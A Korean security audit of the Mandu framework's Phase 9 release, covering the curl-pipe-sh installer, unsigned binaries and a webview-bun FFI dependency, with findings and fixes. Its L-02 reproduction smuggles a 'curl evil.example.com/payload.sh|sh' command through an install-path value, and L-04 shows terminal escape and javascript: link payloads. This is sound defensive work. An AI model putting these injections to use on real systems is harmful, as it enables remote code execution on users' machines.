---
title: "Phase 9 — 보안 감사 보고서 (R3 최종 게이트)"
status: audit-complete
audience: Mandu core team + release review
scope:
  - Phase 9.R1 `461a557` (CLI UX + --compile binary + cross-platform release + webview-bun desktop)
  - Phase 9.R2 `7a09c6d` (binary-mode markdown fix + cross-compile dry-run + hard assertions)
last_commit_audited: 7a09c6d
previous_audit: docs/security/phase-7-2-audit.md
related:
  - docs/bun/phase-9-team-plan.md
  - docs/bun/phase-9-benchmarks.md
  - docs/bun/phase-9-diagnostics/webview-api.md
  - docs/bun/phase-9-diagnostics/compile-binary.md
  - docs/bun/phase-9-diagnostics/markdown-cli-ux.md
  - docs/bun/phase-9-diagnostics/webview-bun-ffi.md
created: 2026-04-18
---

# Phase 9 — 보안 감사 보고서

Phase 9.R1 + R2 에 대한 merge-gate 감사. 감사 범위는 팀 플랜 §4 R3 의 11 개 focus 항목 전부. Phase 9 는 완전히 **새로운 3 종 공격 표면**을 도입: (1) 네트워크 기반 installer (curl | sh), (2) 서명 없는 배포 바이너리, (3) 서드파티 FFI 기반 네이티브 데스크톱 (`webview-bun` → `libwebview.dll`).

**결론: Critical 0 / High 0 / Medium 2 / Low 4 / Info 5 건. Critical/High 없음 — Phase 9 merge 를 차단할 보안 이슈 없음. 핵심 새 공격 표면 3 종 모두 방어 체계가 최소 요구를 충족: installer 는 HTTPS + SHA-256 sidecar 검증, 바이너리는 체크섬 공개 (서명은 Phase 9.1 follow-up 으로 명시), FFI peer 는 opt-in + URL allowlist + lazy-load 검증. Medium 2 건은 (1) 바이너리 서명/notarization 부재 — Phase 9.1 까지 보류가 계획된 상태, (2) webview-bun 단일-메인테이너 공급망 리스크 — 문서화된 fallback 전략 존재. 양쪽 모두 merge-block 아님.**

---

## 1. 감사 요약

| 심각도 | 카운트 | 상태 |
|---|---|---|
| Critical | **0** | — |
| High | **0** | — |
| Medium | 2 | Phase 9.1 로 보류됨 (이미 문서화) |
| Low | 4 | Phase 9.1 TODO / 문서화 |
| Info | 5 | 문서화 |

### 이전 Round 결과 재검증

Phase 7.2.R3 에서 닫힌 M-01 (manifest schema wire-up) + M-02 (vendor cache TOCTOU) 가 Phase 9 의 새 코드 변경 중 regression 없는지 재검증:

| ID | 항목 | Phase 9 상태 |
|---|---|---|
| 7.2 M-01 | Manifest schema wire-up | ✅ **유지** — `safeValidateBundleManifest` 호출 경로 그대로. Phase 9 가 `ssr.ts` / `streaming-ssr.ts` / `build.ts` 건드리지 않음 |
| 7.2 M-02 | Vendor cache TOCTOU re-hash | ✅ **유지** — `vendor-cache.ts` 변경 없음. |
| 7.3 L-01~L-04 | HDR client hardening | ✅ **유지** — Phase 9 가 runtime/client 건드리지 않음. |

**21/21 manifest-schema 테스트 pass** (`packages/core/src/bundler/__tests__/manifest-schema.test.ts`).

### 감사 범위 매트릭스 (11 focus × 3 sub-phase)

| # | Focus 영역 | 9a CLI UX | 9b binary + installers | 9c desktop FFI | 결과 |
|---|---|---|---|---|---|
| 1 | Installer 스크립트 attack surface | — | `install.sh:84-94, 164-177, 200-253, 282-293` | — | ⚠️ **L-01** (MANDU_REPO redirect), ⚠️ **L-02** (MANDU_INSTALL_DIR PATH write) |
| 2 | GitHub Actions workflow | — | `.github/workflows/release-binaries.yml` 전체 | — | ✅ 통과 (permissions 최소, concurrency 락) + ℹ️ **I-01** (action-gh-release @v2 non-SHA pin) |
| 3 | Binary supply chain (서명 / SBOM) | — | `release-binaries.yml:18-20, 284-286, 312-313` | — | 🟡 **M-01** (unsigned binary + no SLSA attestation — Phase 9.1 로 **공식 보류**) |
| 4 | Template embedding 무결성 | `cli-ux-manifest.js`, `scripts/generate-template-manifest.ts` | `templates-manifest.js` (110 항목) | — | ✅ 통과 — generator 결정론적 + byte-identical 테스트 3 건 (`binary-landing.test.ts:54-76`) |
| 5 | webview-bun FFI 공급망 | — | — | `packages/core/package.json:73-84`, `window.ts:75-105` | 🟡 **M-02** (maintainer 1명 — fallback 문서화로 완화 / postinstall 없음 / prebuilt DLL 직접 배포) |
| 6 | `mandu desktop` 명령 권한 | — | — | `packages/cli/src/commands/desktop.ts:153-168`, `registry.ts:788` | ⚠️ **L-03** (entry path absolute 허용 — 외부 디렉토리 write 가능) |
| 7 | `Bun.markdown` renderer ANSI/OSC8 injection | `packages/cli/src/cli-ux/markdown.ts:70-82`, `init.ts:796-805` | — | — | ⚠️ **L-04** (사용자 입력 `projectName` 이 ANSI escape 를 필터 없이 통과) |
| 8 | `$bunfs` virtual path 누출 | — | `templates.ts:189-194`, `init.ts:191-193` | — | ℹ️ **I-02** (에러 메시지에 `$bunfs/...` 경로 포함 — 이진 구조 노출) |
| 9 | `mandu init` 컴파일 모드 권한 | `init.ts:58-64, 399` | `init.ts:58-64, 399` | — | ✅ 통과 — `resolveTemplateName` 화이트리스트 + `..` / absolute 거부 |
| 10 | optional peer dep 처리 | — | — | `window.ts:75-105`, `desktop.ts:261-273` | ✅ 통과 — lazy import + actionable error + peerDependenciesMeta.optional |
| 11 | `@mandujs/skills` ENOENT (R2 flag) | `init.ts:502` | `packages/skills/src/init-integration.ts:67-78` | — | ℹ️ **I-03** (바이너리 init 시 9 회 ENOENT — 무해한 degraded 동작, skills 미임베딩 설계) |

### 신규 공격 표면 3 종 vs Phase 7 공격 표면 비교

| 공격 표면 | 심각도 가능성 | Phase 9 방어 체계 | 잔여 리스크 |
|---|---|---|---|
| Installer `curl \| sh` | 🔴 최대 (네트워크) | HTTPS + SHA-256 sidecar + `--frozen` tag | MANDU_REPO / INSTALL_DIR env redirect (L-01/L-02) |
| 서명 없는 바이너리 배포 | 🔴 최대 (공급망) | SHA256SUMS.txt 공개 + `[early-access]` 명시 | Windows SmartScreen 경고 (M-01 — Phase 9.1 보류) |
| webview-bun FFI (native DLL) | 🟡 중간 (외부 의존성) | Optional peer + URL validation + lazy import | maintainer 1명 (M-02 — fallback 문서화) |

---

## 2. Medium 발견 상세

### M-01 — 배포 바이너리가 서명되지 않음 (Windows SmartScreen / macOS Gatekeeper)

**심각도**: Medium — 공급망 공격의 사용자 측 최후 방어선 부재. Phase 9.1 까지 공식 보류 상태라 Phase 9 merge 를 block 하진 않지만, 현재 릴리스된 바이너리를 사용자가 실행할 때마다 Windows SmartScreen 경고 + macOS Gatekeeper quarantine 가 발생하여 **보안 교육 기회 상실** (사용자가 경고를 무시하는 습관 형성).
**상태**: 공식 보류 중 (Phase 9.1), release note 에 `[early-access]` 태그로 명시됨
**파일**:
- `.github/workflows/release-binaries.yml:18-20` (서명 없음 명시 주석)
- `.github/workflows/release-binaries.yml:284-286` (release body notice)
- `.github/workflows/release-binaries.yml:312-313` (사용자에게 `xattr -d com.apple.quarantine` 안내)
- `packages/cli/scripts/build-binary.ts:95-107` (Windows metadata 는 있으나 서명 코드 없음)

**CWE**: [CWE-345 Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html), [CWE-494 Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
**OWASP**: A08:2021 — Software and Data Integrity Failures

#### 영향

배포되는 모든 `mandu-*` 바이너리는:
1. **Windows**: Microsoft EV code-signing certificate 미사용 → 실행 시 SmartScreen 이 "Windows protected your PC" 경고. 사용자 습관적으로 "More info → Run anyway" 클릭 → 미래 악성 바이너리도 같은 방식으로 통과 가능.
2. **macOS**: Apple Developer ID + notarization 미수행 → Gatekeeper 가 "mandu cannot be opened because the developer cannot be verified" 차단. release note 에서 `xattr -d com.apple.quarantine` 우회 안내 제공 — 이 자체가 **가장 위험한 보안 우회 습관**을 사용자에게 학습시킴.
3. **SLSA / provenance attestation 없음**: GitHub Actions 의 `actions/attest-build-provenance` 같은 SLSA Level 3 attestation 미사용. 바이너리가 정말 이 workflow 에서 빌드됐는지 독립 검증 불가.

사용자 측면에서 제공되는 방어는 `SHA256SUMS.txt` 만:
- `install.sh:233-253` 이 이를 자동 검증 — **좋음**.
- 단, `.sha256` 파일 자체가 같은 GitHub Release 에 있으므로, 만약 Release 가 훼손되면 해시도 함께 교체됨. **독립적 신뢰 기반 (e.g. Sigstore, transparency log) 없음.**

#### 재현 단계 (공격 체인, 이론)

1. 공격자가 `konamgil/mandu` 의 maintainer 계정을 탈취 (phishing / token leak) — 또는 fork + PR 을 통한 내부 위협.
2. `release-binaries.yml` 에 영향을 주는 PR 을 merge 후 `v99.0.0` 태그 push — workflow 가 악성 바이너리 + 일치하는 SHA256 을 Release 에 attach.
3. 사용자가 `curl ... install.sh | sh` 실행 → sidecar 검증 성공 (해시는 악성 바이너리와 매치) → 바이너리 설치.
4. 바이너리 내 악성 코드가 PATH 상에서 `mandu` 로 상주 → 사용자 프로젝트에서 `mandu init` 실행 시 공격자가 원하는 파일 작성 / env 수집.

#### 공격 전제

- **maintainer 계정 탈취 OR 악의적 PR merge**: 내부 위협 모델. Phase 9 가 새로 도입한 공격면이라기보다 "이미 사용되던 npm 배포 경로 대비 사용자 쪽 진입 장벽이 낮아짐 (curl \| sh 가 npm install + build 보다 편함)" — 위협 확대가 아닌 velocity 변화.
- 공급망 공격자 입장에서 **서명 우회가 불필요**하므로 "서명 없음" 이 방어막 한 겹을 빼앗김.

#### 권장 조치 (Phase 9.1 로 보류 — Phase 9 merge 무관)

**방안 A (최우선, 이미 문서화됨)** — Phase 9.1 에서:
1. Windows: EV code-signing cert 구매 (Sectigo / DigiCert) → Microsoft SmartScreen reputation 빌드.
2. macOS: Apple Developer ID ($99/yr) → `codesign` + `notarytool`.
3. GitHub Actions `actions/attest-build-provenance@v1` 도입 — SLSA Level 3 attestation 자동 생성.

**방안 B (중간)** — 즉시 가능한 하드닝:
1. `release-binaries.yml:280` `softprops/action-gh-release@v2` → SHA pin (`@v2.0.4` 대신 `@<sha>`) 으로 비 pinned action 변조 차단.
2. `install.sh` / `install.ps1` 에 `MANDU_REPO` env override 시 strong warning 출력 (현재는 조용히 수락).

**판단**: M-01 은 **Phase 9 merge 를 block 하지 않는다**. 팀 플랜 §7 Phase 9.1 follow-up 에 이미 "Code signing 실제 수속" 이 첫 항목으로 등재되어 있고, release note `[early-access]` 가 사용자에게 명시적으로 경고함. 현재 상태는 **의도된 기술 부채** (intentional technical debt).

---

### M-02 — `webview-bun` 서드파티 공급망 단일 장애점 (maintainer 1명)

**심각도**: Medium — 외부 의존성 공급망 리스크. Mandu 가 직접 통제 불가능. 완화책이 이미 문서화되어 있지만, runtime 검증은 없음.
**상태**: 문서화됨 (`docs/bun/phase-9-diagnostics/webview-bun-ffi.md:38`)
**파일**:
- `packages/core/package.json:73-74` (peerDependency `webview-bun: ^2.4.0`)
- `packages/core/package.json:82-84` (optional: true)
- `packages/core/src/desktop/window.ts:75-105` (lazy import + error message)
- `docs/bun/phase-9-diagnostics/webview-bun-ffi.md:38` (fallback plan 서술)

**CWE**: [CWE-829 Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html), [CWE-1329 Reliance on Component That is Not Updateable](https://cwe.mitre.org/data/definitions/1329.html)
**OWASP**: A06:2021 — Vulnerable and Outdated Components

#### 영향

`webview-bun` (tr1ckydev/webview-bun, MIT, v2.4.0) 는:
- **maintainer 1명** (`tr1ckydev`) — 단일 장애점
- 기여자 3명 (citkane, WebReflection, StrangeBytesDev)
- 최근 업데이트: 2026-02 (issue #44) — 활발하지만 bus-factor 1
- npm install 시 `postinstall` 없음 (`package.json` 확인 완료) — **supply chain attack 의 가장 흔한 진입점 (postinstall 스크립트) 없음** — 긍정적
- prebuilt `libwebview.dll` / `.dylib` / `.so` 를 `node_modules/webview-bun/build/` 에서 직접 배포 (다운로드 없음) — **긍정적**

공격 시나리오:
1. **maintainer 계정 탈취** → `webview-bun@2.x.x` 에 악성 코드 publish → `bun install` 단계에서 node_modules 에 진입 → `mandu desktop scaffold` 실행 시 lazy import → 악성 코드 실행.
2. **prebuilt DLL 변조** → tr1ckydev 가 libwebview 상류 C++ 를 재컴파일할 때 백도어 주입 → FFI 호출 시 네이티브 코드 실행. 이 공격은 `webview-bun` 의 정책 (prebuilt DLL 사용) 때문에 특히 감지 어려움 — 사용자는 DLL 바이너리를 검증할 수단 없음.

#### 공격 전제

- `webview-bun` maintainer 계정 탈취 (phishing / npm token leak)
- OR tr1ckydev 자신의 악의적 행위 — 1-maintainer 조직의 본질적 리스크

#### 완화 (현재 코드)

1. **Optional peer** (`package.json:82-84`) — 사용자가 `bun add webview-bun` 명시 설치 해야만 로드. 실수로 악성 코드 진입 불가.
2. **Lazy import** (`window.ts:88`) — `createWindow()` 호출 전까지 peer 로드 안 함. `bun test` / 기본 Mandu 프로젝트는 영향 없음.
3. **Actionable install 메시지** (`window.ts:92-103`) — peer 누락 시 강한 경고.
4. **URL validation** (`window.ts:151-226`) — `http/https/file/data` 외 프로토콜 거부. 악의적 peer 가 `javascript:` 주입 불가능 (이 방어는 peer 자체 코드를 안 믿으므로 peer 탈취 시 효과 제한적).

#### 부재한 완화

1. **Runtime 무결성 검증 없음** — `libwebview.dll` 의 SHA-256 을 `core/desktop/window.ts` 내에서 pin 하지 않음. 사용자 기기에서 악성 DLL 주입 감지 불가.
2. **Subresource Integrity 검증 없음** — `bun install` 의 lockfile `bun.lock` 이 package integrity hash 포함하지만, 이는 **npm 레지스트리의 hash 가 변조되지 않았을 때만** 유효. npm 자체가 공격자 통제 하에 있으면 방어 없음.

#### 권장 조치 (Phase 9.1 선택)

**방안 A (최소, 권장)**:
1. `docs/bun/phase-9-diagnostics/webview-bun-ffi.md:38` 의 FFI fallback 을 **Phase 9.1 prototype 으로 승격** — `@mandujs/core/desktop/ffi-fallback.ts` 에 인라인 FFI (~50 LOC) 구현 + feature flag `MANDU_DESKTOP_INLINE_FFI=1` 로 opt-in. tr1ckydev 가 공급망 사고 발생 시 **즉시 swap 가능한 탈출구** 확보.
2. `window.ts:88` `await import("webview-bun")` 직후 `mod.Webview.toString()` 해시 체크 — 악성 prototype pollution 탐지. 비용 거의 없음.

**방안 B (중간, Phase 10+)**:
1. Sigstore/cosign 기반 `webview-bun` 다운로드 무결성 검증 — npm 레지스트리 공격에도 방어.

**판단**: M-02 는 **Phase 9 merge 를 block 하지 않는다**. 외부 의존성 리스크는 우리가 도입하는 모든 optional peer 의 본질이며, lazy import + opt-in + fallback 문서화 세 겹의 방어가 이미 존재. 방안 A (방안 A-1 특히) 를 Phase 9.1 에 포함 권장.

---

## 3. Low 발견 상세

### L-01 — `MANDU_REPO` env override 시 경고 없이 임의 GitHub repo 로 redirect

**심각도**: Low (사용자 측 env 조작 전제 — 이미 로컬 실행 능력 보유)
**파일**: `install.sh:34` (`MANDU_REPO="${MANDU_REPO:-konamgil/mandu}"`), `install.ps1:55` (동일), `install.bash:65` (동일)
**CWE**: [CWE-494 Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html) (간접), [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)

#### 영향

`install.sh` / `install.ps1` / `install.bash` 가 `MANDU_REPO` env var 를 **조용히 수락**. 공격 시나리오:
1. 피해자 기기의 `~/.bashrc` 에 공격자가 `export MANDU_REPO=evil-fork/mandu` 주입 (다른 공격 벡터로 진입 이미 성공한 경우).
2. 피해자가 공식 docs 에서 복사한 `curl -fsSL .../install.sh | sh` 실행.
3. 스크립트는 `evil-fork/mandu/releases/latest/download/mandu-linux-x64` 를 다운로드.
4. 공격자는 `evil-fork/mandu` 저장소에 `SHA256SUMS.txt` + 악성 바이너리 + 일치하는 sha256 모두 attach → `install.sh:241` 의 체크섬 검증 통과 → 악성 바이너리 설치.

script 는 dry-run 또는 실행 시 `log "  ${DIM}repo${RST}        ${MANDU_REPO}"` 로 **echo 는 해주나 경고는 없음**. 사용자가 터미널을 자세히 읽지 않으면 repo 가 바뀐 사실을 모름.

#### 공격 전제

- 피해자 기기의 shell profile 에 env var 주입 능력 (이미 로컬 실행 필요) — "이미 게임 오버" 에 가까움.
- Low 유지 사유: 공격자가 local RCE 를 이미 가진 상태라면 `install.sh` 를 공격할 이유가 약함.

#### 권장 조치 (Phase 9.1 선택)

`install.sh` / `install.ps1` 에서 `MANDU_REPO` 가 기본값 (`konamgil/mandu`) 이 아닐 경우 **loud warning** 출력:

```sh
# install.sh:183-189 근처
if [ "${MANDU_REPO}" != "konamgil/mandu" ]; then
  log ""
  log "${YEL}${BOLD}WARNING${RST}: MANDU_REPO override active — downloading from ${MANDU_REPO}"
  log "           (default is konamgil/mandu). Ctrl+C in 3 seconds to abort."
  sleep 3
fi
```

`install.ps1` 동일 패턴.

### L-02 — `MANDU_INSTALL_DIR` 가 shell profile 에 직접 삽입됨 (PATH injection)

**심각도**: Low (사용자 측 env 조작 전제 + 이미 shell profile write 권한 있음)
**파일**: `install.sh:283-293`, `install.ps1:213-238`

```sh
# install.sh:286-292
for profile in "${HOME}/.bashrc" "${HOME}/.zshrc" "${HOME}/.profile"; do
  [ -f "${profile}" ] || continue
  if ! grep -q "${MANDU_INSTALL_DIR}" "${profile}" 2>/dev/null; then
    printf '\n# Added by Mandu installer\nexport PATH="%s:$PATH"\n' "${MANDU_INSTALL_DIR}" >> "${profile}"
    log "  -> appended PATH entry to ${profile}"
    break
  fi
done
```

`MANDU_INSTALL_DIR` 에 double-quote 포함 시 (`$HOME/.mandu/bin";curl evil.com/p|sh;#`) shell profile 에 임의 명령이 주입됨. `printf '...%s...' "${MANDU_INSTALL_DIR}"` 의 `%s` 는 string 을 그대로 쓰므로 escape 안 됨.

#### 재현

```bash
MANDU_INSTALL_DIR='/tmp/mandu";curl https://evil.example.com/payload.sh|sh;#' \
  sh install.sh
```

이후 `~/.bashrc` 를 열면:
```
# Added by Mandu installer
export PATH="/tmp/mandu";curl https://evil.example.com/payload.sh|sh;#:$PATH"
```

다음 shell 시작 시 `curl evil ... | sh` 실행됨.

#### 공격 전제

- 공격자가 사용자의 env var 를 이미 조작 가능 (L-01 과 동일 전제).
- Low 유지 사유: 공격자가 이미 shell env 조작 가능 = 이미 임의 코드 실행 가능.

#### 권장 조치 (Phase 9.1 선택)

`MANDU_INSTALL_DIR` 에 shell metachar (`;`, `$`, `` ` ``, `"`, `'`, `\n`) 포함 시 거부:

```sh
# install.sh:36 직후
case "${MANDU_INSTALL_DIR}" in
  *[\;\$\`\"\'\\\\]*)
    err "MANDU_INSTALL_DIR contains unsafe characters"
    exit 1
    ;;
esac
```

그리고 `printf` 대신 `echo` + parameter expansion 으로 escape 확실히:

```sh
printf '\n# Added by Mandu installer\nexport PATH=%q:$PATH\n' "${MANDU_INSTALL_DIR}" >> "${profile}"
```

(`%q` 는 POSIX sh 에 없으므로 bash 전용 — `install.bash` 에서만 가능. POSIX sh 는 문자 필터가 최선.)

### L-03 — `mandu desktop --entry=<absolute-path>` 외부 디렉토리 쓰기 허용

**심각도**: Low (사용자 플래그 전제 — foot-gun 이지만 remote-exploit 없음)
**파일**:
- `packages/cli/src/commands/desktop.ts:156-158`
- `packages/cli/src/commands/desktop.ts:193-197`
- `packages/cli/src/commands/registry.ts:788`

```ts
// desktop.ts:156-158
const entryPath = path.isAbsolute(options.entry)
  ? options.entry
  : path.join(options.cwd, options.entry);
```

사용자가 `mandu desktop scaffold --entry=/tmp/evil.ts --force` 실행 시 desktop 엔트리 템플릿을 `/tmp/evil.ts` 에 작성. Desktop 엔트리는 `startServer()` + Worker spawn 코드 — 실행되지 않으므로 즉시 RCE 는 아님 — 하지만:

- `/etc/cron.hourly/evil.sh` 처럼 **자동 실행되는 경로** 에 쓰면 root crontab 이 있는 경우 (사용자가 sudo 로 실행한 경우) 권한 상승 가능.
- `~/.ssh/authorized_keys` 같은 파일은 **덮어쓰기**. `force:true` 옵션 필요하지만 스크립트 내부에서 쓸 때 문제.

#### 공격 전제

- **사용자가 직접 `--entry=<absolute>` + `--force` 를 입력** — 외부 공격 벡터 없음.
- Low 유지 사유: CLI 는 그 사용자를 신뢰. Git command 도 `--help=/dev/null` 을 거부하지 않음.

#### 권장 조치 (Phase 9.1 선택)

`scaffoldDesktopEntry()` 가 `entryPath` 가 `cwd` 바깥이면 거부:

```ts
// desktop.ts:153 직후
if (path.isAbsolute(options.entry)) {
  const rel = path.relative(options.cwd, options.entry);
  if (rel.startsWith("..") || path.isAbsolute(rel)) {
    throw new Error(
      `[mandu desktop] --entry must be inside the project directory: ${options.cwd}`
    );
  }
}
```

### L-04 — `Bun.markdown.ansi` 가 사용자 입력의 ANSI escape / OSC 8 를 sanitize 없이 통과

**심각도**: Low (로컬 단말만 영향, 외부 노출 없음, 사용자가 직접 입력 형태만 가능)
**파일**:
- `packages/cli/src/cli-ux/markdown.ts:70-82` (renderMarkdown 의 Bun.markdown.ansi 호출)
- `packages/cli/src/commands/init.ts:796-805` (renderInitLanding 의 placeholder 치환 — sanitize 없음)
- `packages/cli/src/errors/messages.ts:166-173` (formatCLIError 의 template interpolation — sanitize 없음)

#### 영향

실측:

```bash
$ bun -e "console.log(JSON.stringify(Bun.markdown.ansi('test\x1b[2Jinjected', {colors: false})))"
"test\u001b[2Jinjected\n"
```

`Bun.markdown.ansi()` 는 source 문자열의 raw ANSI escape code (`\x1b[2J` = 화면 클리어) 를 **sanitize 없이 통과**시킨다. 또한 OSC 8 hyperlink 에 `javascript:` URL 허용:

```bash
$ bun -e "console.log(JSON.stringify(Bun.markdown.ansi('[link](javascript:alert(1))', {hyperlinks: true})))"
"\u001b]8;;javascript:alert(1)\u001b\\..."
```

공격 시나리오:
1. CI 자동화가 `mandu init "<user-submitted-name>"` 실행. 사용자가 name 으로 `\x1b[2J\x1b[HInstall succeeded` 제출.
2. 랜딩 template 의 `{{projectName}}` 에 주입 → `renderMarkdown` 이 ANSI 통과 → **CI 로그를 클리어 후 가짜 성공 메시지 덮어쓰기** 가능.

또는:
1. `mandu dev` 중 port conflict → `formatCLIError(DEV_PORT_IN_USE, {port: <attacker-controlled-number>})`. `port` 는 number 이므로 ANSI 불가. **이 경로는 안전**.
2. 그러나 `formatCLIError(INIT_DIR_EXISTS, {path: <targetDir>})` 에서 `targetDir = path.resolve(cwd, projectName)`. `projectName = "foo\x1b[2JinjectedFake"` 이면 `path.resolve()` 가 특수문자를 그대로 통과 (OS 가 디렉토리명으로 허용할 수도 있음) → 에러 렌더 시 ANSI 탈출.

#### 공격 전제

- 사용자 입력이 **자동화 파이프라인 (CI, 스크립트)** 에 의해 공급되고, **로그를 제3자가 관측** 할 수 있는 환경. 수동 실행은 self-injection 뿐이라 의미 없음.

#### 권장 조치 (Phase 9.1 선택)

`renderMarkdown()` 에서 input 을 render 하기 **전에** ANSI escape (0x1B) + 기타 C0 제어문자 (0x00-0x1F, 0x7F) 중 safe 한 것 (TAB=0x09, LF=0x0A) 만 허용:

```ts
// markdown.ts:62 직후 (renderMarkdown 진입점)
function sanitizeControl(source: string): string {
  // Strip all C0 control chars except TAB (0x09), LF (0x0A) — these are
  // the only ones Markdown actually uses. Also strip C1 (0x80-0x9F) and
  // DEL (0x7F) which can inject terminal sequences via UTF-8 paths.
  // eslint-disable-next-line no-control-regex
  return source.replace(/[\u0000-\u0008\u000B-\u001F\u007F\u0080-\u009F]/g, "");
}

export function renderMarkdown(source: string, opts: RenderOptions = {}): string {
  if (typeof source !== "string") return "";
  const clean = sanitizeControl(source);
  // ... 이후 동일
}
```

OSC 8 hyperlinks 의 경우 `opts.hyperlinks` 가 true 일 때만 허용. URL scheme allowlist (`http:`, `https:`, `mailto:`) 는 Phase 9.1 이후 고려.

---

## 4. Info / 기타

| ID | 제목 | 파일 / 라인 | 비고 |
|---|---|---|---|
| I-01 | `softprops/action-gh-release@v2` non-SHA pin | `.github/workflows/release-binaries.yml:280` | `@v2` tag 는 움직일 수 있음. `@<sha256>` 로 pin 권장 (SLSA 모범사례). 현재는 upstream 공격 시 Mandu 릴리스도 오염 가능. |
| I-02 | `$bunfs/...` 가상 경로가 에러 메시지에 포함 | `packages/cli/src/util/templates.ts:190-193`, `packages/cli/src/commands/init.ts:190-193` | 바이너리 내부 구조 소량 누출. `$bunfs/root/...` 은 고정 패턴이라 실질 정보량 낮음. |
| I-03 | 바이너리 init 시 `@mandujs/skills` 9회 ENOENT (R2 flag) | `packages/skills/src/init-integration.ts:67-78` | Skills 디렉토리가 `with { type: "file" }` 임베딩 안 됐음. `mandu init` 가 "Claude Code skills" 단계에서 9 개 warning 출력 → 사용자 혼란. 무해 (skills 는 optional) 하지만 UX 저하. Phase 9.1 에서 skills 도 manifest 임베딩 권장. |
| I-04 | `window.__MANDU_ROUTER_REVALIDATE__` hook 여전히 prod 에 설치 | `packages/core/src/client/router.ts:694-698` | Phase 7.3 L-03 의 잔존. Phase 9 와 무관. |
| I-05 | Windows metadata 옵션 (`--windows-title` 등) 이 자동 서명 제공 아님 | `packages/cli/scripts/build-binary.ts:95-107` | Bun 은 Windows 바이너리에 metadata 를 넣을 수 있지만 서명과 별개. 사용자가 "metadata=서명" 로 오해할 위험. docs 에 명시 필요. |

---

## 5. 방어 심층 (Defense-in-depth) 확인

Phase 9 가 Phase 7.2/7.3 의 방어 체계를 훼손하지 않았음:

| 패치 | 위치 | Phase 9 상태 |
|---|---|---|
| 7.0.S Origin allowlist | `dev.ts:1470-1487` | ✅ 유지 — Phase 9 가 dev.ts 건드리지 않음 |
| 7.1.L-01 `acceptFile` URL cap | `fast-refresh-plugin.ts:182-190` | ✅ 유지 |
| 7.1.L-03 `SLOT_PATH_REGEX` | `dev.ts:477-507` | ✅ 유지 |
| 7.2.M-01 schema wire-up | `ssr.ts:243-246`, `streaming-ssr.ts:525-527` | ✅ 유지 |
| 7.2.M-02 vendor cache TOCTOU | `vendor-cache.ts:347-358` | ✅ 유지 |

manifest-schema 테스트 **21/21 pass** + core desktop 테스트 **25 pass / 1 skip / 0 fail** + CLI 전체 테스트 **221 pass / 0 fail**.

Phase 9 는 runtime/bundler 코드를 **건드리지 않음**. 새 코드는:
- `packages/cli/src/cli-ux/` (신규)
- `packages/cli/src/util/templates.ts` (신규)
- `packages/cli/src/commands/desktop.ts` (신규)
- `packages/core/src/desktop/` (신규)
- `packages/cli/scripts/` (신규 build scripts)
- `packages/cli/generated/` (신규 생성 파일)
- `.github/workflows/release-binaries.yml` (신규)
- `install.sh` / `install.ps1` / `install.bash` (신규)
- `demo/desktop-starter/` (신규)

기존 프로덕션 경로 0 건 편집. 기존 보안 블록 훼손 없음.

---

## 6. 새 공격 표면 — 상세 분석

### 6.1 Installer (`curl | sh`)

**Positive 방어**:
- ✅ HTTPS 강제 (`github.com/konamgil/mandu/releases/download/...`)
- ✅ SHA-256 sidecar 자동 다운로드 + 검증 (`install.sh:233-253`)
- ✅ Checksum 불일치 시 exit 4 + 명시적 에러 메시지
- ✅ Dry-run 모드 (`--dry-run`)
- ✅ Exit codes 표준화 (0=ok, 2=unsupported, 3=download, 4=checksum)
- ✅ Smoke 테스트 (`smoke-install.sh`) 가 CI 에서 syntax + URL 일관성 검증
- ✅ Temp directory 자동 정리 (`trap 'rm -rf "${TMPDIR}"' EXIT INT TERM`)
- ✅ Architecture 자동 감지 + musl/glibc 구분 (Alpine 지원)
- ✅ Git Bash / MSYS 거부 (install.ps1 로 redirect)

**부정 측면**:
- ⚠️ L-01: `MANDU_REPO` override 조용히 수락
- ⚠️ L-02: `MANDU_INSTALL_DIR` shell profile 주입
- ℹ️ Checksum 누락 시 **경고만 출력하고 계속 진행** (`install.sh:249`) — "earlier releases" 호환성 명목. 현재는 R2 이후 모든 release 가 checksum 포함하므로 이 fallback 을 제거할 시점.

### 6.2 GitHub Actions Release Workflow

**Positive 방어**:
- ✅ `permissions: contents: write` 로 토큰 권한 최소화
- ✅ `concurrency: release-binaries-${{ github.ref }}` 로 동일 tag 중복 빌드 차단
- ✅ 바이너리 크기 sanity bound (40MB ~ 400MB — `release-binaries.yml:148-151`)
- ✅ Native target 만 smoke test (cross-compile 실행 시도 안 함)
- ✅ SHA-256 aggregate file (`SHA256SUMS.txt`) 생성

**부정 측면**:
- ⚠️ I-01: `softprops/action-gh-release@v2` SHA pin 아님
- 🟡 M-01: SLSA provenance attestation 부재
- ⚠️ 바이너리 서명 없음

### 6.3 Desktop FFI (webview-bun)

**Positive 방어**:
- ✅ Optional peer + peerDependenciesMeta.optional (`package.json:82-84`)
- ✅ Lazy import — `bun test` / 기본 프로젝트 영향 없음 (`window.ts:88`)
- ✅ Actionable install 에러 (`window.ts:92-103`)
- ✅ URL protocol allowlist — `http/https/file/data` 외 거부 (`window.ts:164-179`)
- ✅ 옵션 전체 validation (`_validateOptions`)
- ✅ Close 시 idempotent (`window.ts:336-370`)
- ✅ Worker protocol 에 대한 명시적 타입 (`types.ts:137-159`)
- ✅ postinstall 스크립트 없음 (webview-bun package.json 확인)
- ✅ Prebuilt DLL 직접 배포 (다운로드 없음)

**부정 측면**:
- 🟡 M-02: maintainer 1명 — 공급망 장애점
- ⚠️ Runtime DLL 무결성 검증 없음

### 6.4 Template Embedding (110 files)

**Positive 방어**:
- ✅ Generator 스크립트 결정론적 (sorted + counter-based 충돌 회피)
- ✅ Byte-identical 테스트 (`binary-landing.test.ts:54-76`) — manifest 과 on-disk 불일치 즉시 감지
- ✅ `with { type: "file" }` 는 **정적 임포트만** — 동적 glob 불가능 (공격 표면 축소)
- ✅ 템플릿 파일은 repo-committed → PR review 단계에서 악성 템플릿 삽입 차단 (개발 프로세스 방어)
- ✅ 바이너리 내 임베딩 후 수정 불가능 ($bunfs 는 read-only)

**부정 측면**:
- ℹ️ I-02: $bunfs 경로가 에러 메시지 노출
- ℹ️ I-03: skills 는 임베딩 안 됨 → 바이너리 init 시 ENOECE

### 6.5 Compiled Binary (`mandu.exe` / Linux / macOS)

**Positive 방어**:
- ✅ `--sourcemap=none` (소스 정보 최소화)
